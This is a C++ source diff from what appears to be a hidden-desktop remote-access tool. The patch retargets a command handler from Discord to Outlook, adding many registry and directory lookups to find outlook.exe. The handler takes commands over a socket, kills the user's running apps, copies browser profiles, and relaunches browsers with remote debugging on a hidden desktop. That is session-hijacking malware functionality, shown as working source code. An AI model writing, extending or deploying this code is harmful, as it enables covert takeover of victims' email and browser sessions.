@@ -1878,17 +1878,178 @@ static wstring resolve_gecko_profile_from_ini(const wstring& geckoUserDataDir) {
     return L"";
 }
 
+static wstring clean_registry_path(wstring path) {
+    while (!path.empty() && (path.front() == L' ' || path.front() == L'"' || path.front() == L'\'')) {
+        path.erase(path.begin());
+    }
+    size_t quotePos = path.find(L'"');
+    if (quotePos != wstring::npos) {
+        path = path.substr(0, quotePos);
+    }
+    quotePos = path.find(L'\'');
+    if (quotePos != wstring::npos) {
+        path = path.substr(0, quotePos);
+    }
+    while (!path.empty() && path.back() == L' ') {
+        path.pop_back();
+    }
+    wstring lowerPath;
+    for (wchar_t c : path) lowerPath += towlower(c);
+    size_t exePos = lowerPath.find(L".exe");
+    if (exePos != wstring::npos) {
+        path = path.substr(0, exePos + 4);
+    }
+    for (size_t i = 0; i < path.size(); i++) {
+        if (path[i] == L'/') path[i] = L'\\';
+    }
+    while (!path.empty() && (path.back() == L' ' || path.back() == L'\\' || path.back() == L'/')) {
+        path.pop_back();
+    }
+    return path;
+}
+
+static wstring get_outlook_client_path() {
+    HKEY hKey;
+    wstring subkey = L"SOFTWARE\\Clients\\Mail\\Microsoft Outlook\\shell\\open\\command";
+    wstring path;
+    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, subkey.c_str(), 0, KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS) {
+        wchar_t buffer[MAX_PATH * 2];
+        DWORD size = sizeof(buffer);
+        if (RegQueryValueExW(hKey, NULL, NULL, NULL, (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
+            path = buffer;
+        }
+        RegCloseKey(hKey);
+    }
+    if (path.empty()) {
+        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, subkey.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+            wchar_t buffer[MAX_PATH * 2];
+            DWORD size = sizeof(buffer);
+            if (RegQueryValueExW(hKey, NULL, NULL, NULL, (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
+                path = buffer;
+            }
+            RegCloseKey(hKey);
+        }
+    }
+    if (path.empty()) {
+        if (RegOpenKeyExW(HKEY_CURRENT_USER, subkey.c_str(), 0, KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS) {
+            wchar_t buffer[MAX_PATH * 2];
+            DWORD size = sizeof(buffer);
+            if (RegQueryValueExW(hKey, NULL, NULL, NULL, (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
+                path = buffer;
+            }
+            RegCloseKey(hKey);
+        }
+    }
+    if (path.empty()) {
+        if (RegOpenKeyExW(HKEY_CURRENT_USER, subkey.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+            wchar_t buffer[MAX_PATH * 2];
+            DWORD size = sizeof(buffer);
+            if (RegQueryValueExW(hKey, NULL, NULL, NULL, (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
+                path = buffer;
+            }
+            RegCloseKey(hKey);
+        }
+    }
+    return clean_registry_path(path);
+}
+
+static wstring find_outlook_in_dir(const wstring& parentDir) {
+    if (parentDir.empty() || !fs::exists(parentDir)) return L"";
+    try {
+        for (const auto& entry : fs::recursive_directory_iterator(parentDir, fs::directory_options::skip_permission_denied)) {
+            try {
+                if (entry.is_regular_file()) {
+                    wstring filename = entry.path().filename().wstring();
+                    if (filename.size() == 11) {
+                        wstring lowerName;
+                        for (wchar_t c : filename) lowerName += towlower(c);
+                        if (lowerName == L"outlook.exe") {
+                            return entry.path().wstring();
+                        }
+                    }
+                }
+            } catch (...) {}
+        }
+    } catch (...) {}
+    return L"";
+}
+
+static wstring get_office_install_root(const wstring& version) {
+    HKEY hKey;
+    wstring subkey = L"SOFTWARE\\Microsoft\\Office\\" + version + L"\\Outlook\\InstallRoot";
+    wstring path;
+    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, subkey.c_str(), 0, KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS) {
+        wchar_t buffer[MAX_PATH];
+        DWORD size = sizeof(buffer);
+        if (RegQueryValueExW(hKey, L"Path", NULL, NULL, (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
+            path = buffer;
+        }
+        RegCloseKey(hKey);
+    }
+    if (path.empty()) {
+        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, subkey.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+            wchar_t buffer[MAX_PATH];
+            DWORD size = sizeof(buffer);
+            if (RegQueryValueExW(hKey, L"Path", NULL, NULL, (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
+                path = buffer;
+            }
+            RegCloseKey(hKey);
+        }
+    }
+    if (path.empty()) {
+        if (RegOpenKeyExW(HKEY_CURRENT_USER, subkey.c_str(), 0, KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS) {
+            wchar_t buffer[MAX_PATH];
+            DWORD size = sizeof(buffer);
+            if (RegQueryValueExW(hKey, L"Path", NULL, NULL, (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
+                path = buffer;
+            }
+            RegCloseKey(hKey);
+        }
+    }
+    if (path.empty()) {
+        if (RegOpenKeyExW(HKEY_CURRENT_USER, subkey.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+            wchar_t buffer[MAX_PATH];
+            DWORD size = sizeof(buffer);
+            if (RegQueryValueExW(hKey, L"Path", NULL, NULL, (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
+                path = buffer;
+            }
+            RegCloseKey(hKey);
+        }
+    }
+    return clean_registry_path(path);
+}
+
 static wstring get_app_path(const wstring& appName) {
     HKEY hKey;
     wstring subkey = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\" + appName;
     wstring path;
-    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, subkey.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, subkey.c_str(), 0, KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS) {
         wchar_t buffer[MAX_PATH];
         DWORD size = sizeof(buffer);
         if (RegQueryValueExW(hKey, NULL, NULL, NULL, (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
             path = buffer;
         }
         RegCloseKey(hKey);
+    }
+    if (path.empty()) {
+        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, subkey.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+            wchar_t buffer[MAX_PATH];
+            DWORD size = sizeof(buffer);
+            if (RegQueryValueExW(hKey, NULL, NULL, NULL, (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
+                path = buffer;
+            }
+            RegCloseKey(hKey);
+        }
+    }
+    if (path.empty()) {
+        if (RegOpenKeyExW(HKEY_CURRENT_USER, subkey.c_str(), 0, KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS) {
+            wchar_t buffer[MAX_PATH];
+            DWORD size = sizeof(buffer);
+            if (RegQueryValueExW(hKey, NULL, NULL, NULL, (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
+                path = buffer;
+            }
+            RegCloseKey(hKey);
+        }
     }
     if (path.empty()) {
         if (RegOpenKeyExW(HKEY_CURRENT_USER, subkey.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
@@ -1900,7 +2061,7 @@ static wstring get_app_path(const wstring& appName) {
             RegCloseKey(hKey);
         }
     }
-    return path;
+    return clean_registry_path(path);
 }
 
 static wstring get_browser_profile_path(const wstring& browserName) {
@@ -2156,7 +2317,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                               wRequestedPath == L"Opera" ||
                               wRequestedPath == L"Opera GX" ||
                               wRequestedPath == L"Brave" ||
-                              wRequestedPath == L"Discord" ||
+                              wRequestedPath == L"Outlook" ||
                               wRequestedPath == L"Thunderbird");
 
             bool isGecko = (wRequestedPath == L"Firefox" ||
@@ -2169,6 +2330,8 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     ensure_desktop();
                     if (!g_hHiddenDesktop) return;
 
+                    bool actualCopyProfile = (wRequestedPath == L"Outlook") ? false : copyProfile;
+
                     wstring exeName;
                     if (wRequestedPath == L"Google Chrome") exeName = L"chrome.exe";
                     else if (wRequestedPath == L"Microsoft Edge") exeName = L"msedge.exe";
@@ -2178,41 +2341,101 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     else if (wRequestedPath == L"Opera") exeName = L"opera.exe";
                     else if (wRequestedPath == L"Opera GX") exeName = L"opera.exe";
                     else if (wRequestedPath == L"Brave") exeName = L"brave.exe";
-                    else if (wRequestedPath == L"Discord") exeName = L"discord.exe";
+                    else if (wRequestedPath == L"Outlook") exeName = L"outlook.exe";
                     else if (wRequestedPath == L"Thunderbird") exeName = L"thunderbird.exe";
 
                     if (closeReal && !exeName.empty()) {
                         send_status("Mevcut uygulama kapatılıyor...");
                         kill_process_by_name(exeName);
-                        if (wRequestedPath == L"Discord") {
-                            kill_process_by_name(L"Update.exe");
-                        }
                         Sleep(800);
                     }
 
                     wstring exePath;
-                    if (wRequestedPath == L"Discord") {
-                        wchar_t localApp[MAX_PATH] = {0};
-                        SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localApp);
-                        fs::path discDir(wstring(localApp) + L"\\Discord");
-                        if (fs::exists(discDir)) {
-                            wstring bestAppDir;
-                            for (const auto& entry : fs::directory_iterator(discDir)) {
-                                if (entry.is_directory()) {
-                                    wstring name = entry.path().filename().wstring();
-                                    if (name.rfind(L"app-", 0) == 0) {
-                                        if (bestAppDir.empty() || name > bestAppDir) {
-                                            bestAppDir = name;
-                                        }
+                    if (wRequestedPath == L"Outlook") {
+                        exePath = get_app_path(L"outlook.exe");
+
+                        // 1. Try Default Mail Client path
+                        if (exePath.empty() || !fs::exists(exePath)) {
+                            wstring clientPath = get_outlook_client_path();
+                            if (!clientPath.empty() && fs::exists(clientPath)) {
+                                exePath = clientPath;
+                            }
+                        }
+
+                        // 2. Try registry InstallRoot paths
+                        if (exePath.empty() || !fs::exists(exePath)) {
+                            vector<wstring> versions = { L"16.0", L"15.0", L"14.0" };
+                            for (const auto& ver : versions) {
+                                wstring root = get_office_install_root(ver);
+                                if (!root.empty()) {
+                                    if (root.back() != L'\\' && root.back() != L'/') {
+                                        root += L"\\";
+                                    }
+                                    wstring candidate = root + L"outlook.exe";
+                                    if (fs::exists(candidate)) {
+                                        exePath = candidate;
+                                        break;
                                     }
                                 }
                             }
-                            if (!bestAppDir.empty()) {
-                                exePath = discDir.wstring() + L"\\" + bestAppDir + L"\\Discord.exe";
+                        }
+
+                        // 3. Try common path fallbacks
+                        if (exePath.empty() || !fs::exists(exePath)) {
+                            wchar_t progFiles[MAX_PATH] = {0};
+                            wchar_t progFilesX86[MAX_PATH] = {0};
+                            GetEnvironmentVariableW(L"ProgramFiles", progFiles, MAX_PATH);
+                            GetEnvironmentVariableW(L"ProgramFiles(x86)", progFilesX86, MAX_PATH);
+
+                            wstring pf = progFiles[0] ? progFiles : L"C:\\Program Files";
+                            wstring pfx86 = progFilesX86[0] ? progFilesX86 : L"C:\\Program Files (x86)";
+
+                            vector<wstring> fallbacks = {
+                                pf + L"\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
+                                pfx86 + L"\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
+                                pf + L"\\Microsoft Office\\Office16\\OUTLOOK.EXE",
+                                pfx86 + L"\\Microsoft Office\\Office16\\OUTLOOK.EXE",
+                                pf + L"\\Microsoft Office\\Office15\\OUTLOOK.EXE",
+                                pfx86 + L"\\Microsoft Office\\Office15\\OUTLOOK.EXE",
+                                pf + L"\\Microsoft Office\\Office14\\OUTLOOK.EXE",
+                                pfx86 + L"\\Microsoft Office\\Office14\\OUTLOOK.EXE"
+                            };
+                            for (const auto& fb : fallbacks) {
+                                if (fs::exists(fb)) {
+                                    exePath = fb;
+                                    break;
+                                }
                             }
                         }
+
+                        // 4. Try Microsoft Store execution alias fallback
                         if (exePath.empty() || !fs::exists(exePath)) {
-                            exePath = wstring(localApp) + L"\\Discord\\Update.exe";
+                            wchar_t localApp[MAX_PATH] = {0};
+                            if (SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localApp) == S_OK) {
+                                wstring storeAlias = wstring(localApp) + L"\\Microsoft\\WindowsApps\\outlook.exe";
+                                if (fs::exists(storeAlias)) {
+                                    exePath = storeAlias;
+                                }
+                            }
+                        }
+
+                        // 5. Try recursive directory search on Microsoft Office directories
+                        if (exePath.empty() || !fs::exists(exePath)) {
+                            wchar_t progFiles[MAX_PATH] = {0};
+                            wchar_t progFilesX86[MAX_PATH] = {0};
+                            GetEnvironmentVariableW(L"ProgramFiles", progFiles, MAX_PATH);
+                            GetEnvironmentVariableW(L"ProgramFiles(x86)", progFilesX86, MAX_PATH);
+
+                            wstring pf = progFiles[0] ? progFiles : L"C:\\Program Files";
+                            wstring pfx86 = progFilesX86[0] ? progFilesX86 : L"C:\\Program Files (x86)";
+
+                            wstring searchPf = pf + L"\\Microsoft Office";
+                            exePath = find_outlook_in_dir(searchPf);
+
+                            if (exePath.empty() || !fs::exists(exePath)) {
+                                wstring searchPfX86 = pfx86 + L"\\Microsoft Office";
+                                exePath = find_outlook_in_dir(searchPfX86);
+                            }
                         }
                     } else if (wRequestedPath == L"Opera") {
                         wchar_t localApp[MAX_PATH] = {0};
@@ -2302,7 +2525,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
 
                         profilePath = tempProfileRoot;
 
-                    } else if (copyProfile) {
+                    } else if (actualCopyProfile) {
                         wstring sourceUserData = get_browser_profile_path(wRequestedPath);
 
                         if (sourceUserData.empty() || !fs::exists(sourceUserData)) {
@@ -2347,7 +2570,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         profilePath = tempProfileRoot;
                     }
 
-                    if (!isGecko && !copyProfile && (wRequestedPath == L"Opera" || wRequestedPath == L"Opera GX")) {
+                    if (!isGecko && !actualCopyProfile && (wRequestedPath == L"Opera" || wRequestedPath == L"Opera GX")) {
                         wchar_t tempPath[MAX_PATH];
                         GetTempPathW(MAX_PATH, tempPath);
                         wstring tempProfileRoot = tempPath;
@@ -2402,9 +2625,11 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                                 L" --disable-renderer-backgrounding"
                                 L" --remote-allow-origins=*"
                                 L" --lang=en-US";
+                    } else if (wRequestedPath == L"Outlook") {
+                        args = L"";
                     } else {
                         args = L" --remote-debugging-port=9222";
-                        if (copyProfile) {
+                        if (actualCopyProfile) {
                             args += L" --user-data-dir=\"" + profilePath + L"\"";
                             args += L" --profile-directory=\"" + profileDir + L"\"";
                         }
